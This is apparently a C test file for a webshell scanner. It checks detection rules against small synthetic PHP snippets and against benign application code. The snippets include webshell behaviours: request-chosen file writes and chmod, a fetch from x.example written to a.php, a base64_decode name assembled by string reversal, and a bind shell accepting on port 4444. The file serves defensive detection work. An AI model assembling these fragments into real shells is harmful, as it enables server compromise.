/*
 * diag_text_golden - the fixture diagnoses of the TEXT route that state a behaviour of a webshell, each against small SYNTHETIC php texts:
 * the ones it must find and the ones it must not.
 *
 * WHAT THIS IS FOR. tests/sigs/diagnoses/php_*.c is the reference set of behaviours a script can have in the vocabulary of capabilities (a head
 * and its tails, no function named), and the generator that kofviewer is to grow is validated against it: a diagnose the generator writes for a
 * behaviour must find the texts here that the fixture finds and none that it does not. The third-party samples cannot be that reference (they
 * are not ours to keep, and what they do is many things at once); these texts are written for the purpose, one behaviour each, and the
 * "must not" half is as much of the pin as the "must": a diagnose that anchors on a common call (a request, a write) and fires on a form handler or
 * an http client is worse than one that misses a shell.
 *
 * ALSO PINNED, because they are decisions and not accidents: the behaviours that were tried and left out, with what they fire on - a
 * request-chosen file READ (WordPress's theme editor and ms-files.php do it), a request-chosen DELETE (a pdf script of the corpus unlinks
 * `$path.$_REQUEST['filename']`), a decode written to a file (class-pclzip.php, six scripts of the corpus). No diagnose of those is in the set, so a text of
 * each must fire none of the set: the day one is added, this says what it will have to answer for.
 *
 * Every text begins with a comment of padding: a php file under a few dozen bytes is not read as a script (see diag_text_e2e.c).
 */

#include "caps_fix.h"
#include "caps_e2e.h"

#define PAD "<?php\n// padding padding padding padding padding padding\n"

/* whether the engine's verdict for `src` lists the diagnose `name` */
static int fires(const char *src, const char *name)
{
	struct e2e r;
	const struct kof_finding *f;
	uint32_t i;

	if (!e2e_scan((const uint8_t *)src, strlen(src), &r) || !r.n || !r.o[0].has_verdict)
		return 0;
	f = &r.o[0].vf;
	for (i = 0; i < f->n_diag; i++) {
		const char *n = kdb_diagnose_name(e2e_eng, f->diag[i]);

		if (n && !strcmp(n, name))
			return 1;
	}
	return 0;
}

/* how many diagnoses of the set (php_request_*, php_fetch_*, php_built_decode, php_bind_*, php_listen_*) the verdict lists */
static int fires_any_new(const char *src)
{
	static const char *const set[] = { "php_request_write", "php_request_rename", "php_request_chmod", "php_request_touch", "php_request_connect",
					   "php_request_http", "php_request_dns", "php_fetch_write", "php_built_decode", "php_bind_shell", "php_listen_accept" };
	uint32_t i;
	int n = 0;

	for (i = 0; i < sizeof set / sizeof set[0]; i++)
		n += fires(src, set[i]);
	return n;
}

struct row {
	const char *diag;
	const char *src;
	int         want;
};

#define ROW(d, s, w) { d, PAD s, w }

static const struct row rows[] = {
	/* ---- the request chose what was written: an upload, an editor, a dropper that writes what it is sent ---- */
	ROW("php_request_write", "file_put_contents($_POST['f'], $_POST['c']);\n", 1),
	ROW("php_request_write", "$h = fopen('a.php', 'w'); fwrite($h, $_POST['c']); fclose($h);\n", 1),
	/* the name reaches the OPEN, which the vocabulary says is a read (file-open); the write holds fixed bytes: not this behaviour */
	ROW("php_request_write", "$h = fopen($_GET['p'], 'w'); fwrite($h, 'x'); fclose($h);\n", 0),
	ROW("php_request_write", "$d = $_POST['dest']; move_uploaded_file($_FILES['u']['tmp_name'], $d);\n", 1),
	ROW("php_request_write", "copy($_GET['from'], '/var/www/x.php');\n", 1),
	ROW("php_request_write", "fputs(fopen('a.php', 'w'), $_REQUEST['code']);\n", 1),
	ROW("php_request_write", "file_put_contents('/var/log/app.log', date('c') . \"\\n\", FILE_APPEND);\n", 0),            /* nothing the request chose */
	ROW("php_request_write", "$x = $_GET['x']; echo $x; file_put_contents('a', 'b');\n", 0),                            /* the request never reaches the write */
	ROW("php_request_write", "// file_put_contents($_POST['f'], $_POST['c']);\necho 'file_put_contents($_POST[f], 1)';\n", 0),   /* a comment and a literal */
	ROW("php_request_write", "$f = fopen('/var/log/a', 'w'); fwrite($f, sprintf('%d', 5));\n", 0),
	/* ---- renamed or moved ---- */
	ROW("php_request_rename", "rename($_POST['old'], $_POST['new']);\n", 1),
	ROW("php_request_rename", "$a = $_GET['a']; rename($a, 'backup.bak');\n", 1),
	ROW("php_request_rename", "rename('a.tmp', 'a.php');\n", 0),
	ROW("php_request_rename", "rename($tmp, $dest); echo $_GET['done'];\n", 0),
	/* ---- permissions and owners ---- */
	ROW("php_request_chmod", "chmod($_GET['f'], 0777);\n", 1),
	ROW("php_request_chmod", "chown($_POST['f'], 'root'); chgrp($_POST['f'], 'wheel');\n", 1),
	ROW("php_request_chmod", "chmod('/var/www/cache', 0755);\n", 0),
	ROW("php_request_chmod", "$m = $_GET['mode']; chmod('/var/www/cache', 0755);\n", 0),
	/* ---- times ---- */
	ROW("php_request_touch", "touch($_POST['f'], strtotime($_POST['t']));\n", 1),
	ROW("php_request_touch", "touch($_GET['f']);\n", 1),
	ROW("php_request_touch", "touch('/var/lock/app');\n", 0),
	/* ---- the address of a connection ---- */
	ROW("php_request_connect", "$s = fsockopen($_GET['h'], $_GET['p']);\n", 1),
	ROW("php_request_connect", "$c = ftp_connect($_POST['host']); ftp_login($c, 'a', 'b');\n", 1),
	ROW("php_request_connect", "$s = stream_socket_client('tcp://' . $_GET['h'] . ':80');\n", 1),
	ROW("php_request_connect", "$s = socket_create(AF_INET, SOCK_STREAM, 0); socket_connect($s, $_POST['ip'], 4444);\n", 1),
	ROW("php_request_connect", "$s = fsockopen('localhost', 80); fwrite($s, \"GET / HTTP/1.0\\r\\n\\r\\n\");\n", 0),      /* an http client of a fixed host */
	ROW("php_request_connect", "$h = $_POST['h']; $s = fsockopen('db.internal', 3306);\n", 0),
	/* ---- the address of an http request ---- */
	ROW("php_request_http", "$c = curl_init($_GET['u']); curl_exec($c);\n", 1),
	ROW("php_request_http", "$u = $_POST['url']; $c = curl_init($u);\n", 1),
	ROW("php_request_http", "$c = curl_init('https://api.example.com/v1'); curl_exec($c);\n", 0),
	ROW("php_request_http", "$c = curl_init(); curl_exec($c); echo $_GET['x'];\n", 0),
	/* ---- the name looked up ---- */
	ROW("php_request_dns", "echo gethostbyname($_GET['h']);\n", 1),
	ROW("php_request_dns", "print_r(dns_get_record($_POST['d']));\n", 1),
	ROW("php_request_dns", "echo gethostbyaddr($_REQUEST['ip']);\n", 1),
	ROW("php_request_dns", "echo gethostbyname('example.com');\n", 0),
	ROW("php_request_dns", "$h = $_GET['h']; echo gethostbyname('example.com');\n", 0),
	/* ---- what an http request returned, written ---- */
	ROW("php_fetch_write", "$c = curl_init('http://x.example/a.php'); file_put_contents('a.php', curl_exec($c));\n", 1),
	ROW("php_fetch_write", "$c = curl_init($u); $r = curl_exec($c); fwrite(fopen('a', 'w'), $r);\n", 1),
	ROW("php_fetch_write", "$c = curl_init($u); curl_exec($c); file_put_contents('log', 'done');\n", 0),             /* the write holds nothing the fetch returned */
	ROW("php_fetch_write", "file_put_contents('a', 'b');\n", 0),
	/* ---- a decoder called by a name the script built ---- */
	ROW("php_built_decode", "$f = 'base64_' . 'decode'; echo $f('QQ==');\n", 1),
	ROW("php_built_decode", "$f = strrev('edoced_46esab'); echo $f('QQ==');\n", 1),
	ROW("php_built_decode", "$f = str_replace('Z', '', 'gzZinflZate'); echo $f($d);\n", 1),
	ROW("php_built_decode", "echo base64_decode('QQ==');\n", 0),                                                    /* written where it is used */
	ROW("php_built_decode", "$f = 'strtoupper'; echo $f('a');\n", 0),                                               /* built, and not a decoder */
	/* ---- a script that waits to be connected to ---- */
	ROW("php_bind_shell", "$s = socket_create(AF_INET, SOCK_STREAM, 0); socket_bind($s, '0.0.0.0', 4444); socket_listen($s); $c = socket_accept($s);\n", 1),
	ROW("php_bind_shell", "$s = socket_create(AF_INET, SOCK_STREAM, 0); socket_connect($s, '10.0.0.1', 80);\n", 0),   /* a client */
	ROW("php_bind_shell", "$s = socket_create(AF_INET, SOCK_STREAM, 0); socket_bind($s, '0.0.0.0', 8080); socket_listen($s);\n", 0),   /* listening, and never accepted on */
	ROW("php_bind_shell", "$s = socket_create(AF_INET, SOCK_STREAM, 0); socket_bind($s, '127.0.0.1', 80);\n", 0),     /* bound and nothing more */
	ROW("php_listen_accept", "$srv = stream_socket_server('tcp://0.0.0.0:4444'); $c = stream_socket_accept($srv);\n", 1),
	ROW("php_listen_accept", "$srv = stream_socket_server('tcp://0.0.0.0:4444'); echo 'up';\n", 0),
	ROW("php_listen_accept", "$c = stream_socket_client('tcp://10.0.0.1:80'); echo 'x';\n", 0),
};

/*
 * Texts that look like a shell to a reader of names, written as ordinary applications do, which none of the set may fire on: a form handler
 * that validates a request, an http client with a socket, a cache writer, an updater, a file-based session, a theme editor.
 */
static const char *const benign[] = {
	PAD "function handle() { if (isset($_POST['name'])) { $n = trim($_POST['name']); echo htmlspecialchars($n); } }\n",
	PAD "$h = fsockopen($host, 80, $e, $s, 5); fwrite($h, \"GET / HTTP/1.1\\r\\nHost: $host\\r\\n\\r\\n\"); echo fread($h, 8192); fclose($h);\n",
	PAD "$file = ABSPATH . 'cache/' . md5($key) . '.php'; file_put_contents($file, serialize($data)); chmod($file, 0644);\n",
	PAD "$r = curl_init('https://api.wordpress.org/core/version-check/1.7/'); curl_setopt($r, CURLOPT_RETURNTRANSFER, 1); $body = curl_exec($r); echo $body;\n",
	PAD "$f = $_POST['file']; $c = file_get_contents($f); echo esc_textarea($c);\n",                            /* a request-chosen READ: left out of the set, see above */
	PAD "$path = '../tmp/'; $n = $_REQUEST['filename'] . '.pdf'; unlink($path . $n);\n",                        /* a request-chosen DELETE: left out of the set */
	PAD "file_put_contents('a.bin', gzinflate(substr($data, 10)));\n",                                           /* a decode written: left out of the set */
	PAD "$ip = gethostbyname('localhost'); $name = gethostbyaddr('127.0.0.1');\n",
	PAD "$s = socket_create(AF_INET, SOCK_STREAM, 0); socket_connect($s, $host, $port); socket_write($s, $msg); socket_close($s);\n",
};

int main(int argc, char **argv)
{
	uint32_t i;

	if (!e2e_open(argc > 1 ? argv[1] : NULL)) {
		printf("diag text golden: cannot open the test database\n");
		return 2;
	}
	for (i = 0; i < sizeof rows / sizeof rows[0]; i++) {
		int got = fires(rows[i].src, rows[i].diag);

		if (got != rows[i].want) {
			printf("  FAIL %s %s the text:\n%s\n", rows[i].diag, rows[i].want ? "must fire on" : "must not fire on", rows[i].src);
			fails++;
		}
	}
	for (i = 0; i < sizeof benign / sizeof benign[0]; i++) {
		int n = fires_any_new(benign[i]);

		if (n) {
			printf("  FAIL %d diagnose(s) of the set fire on an ordinary application's text:\n%s\n", n, benign[i]);
			fails++;
		}
	}
	/* a plain page has no verdict at all */
	CK(!fires(PAD "echo 'hello';\n", "php_request_write"));
	printf("diag text golden: %s\n", fails ? "FAILED" : "ok");
	return fails != 0;
}
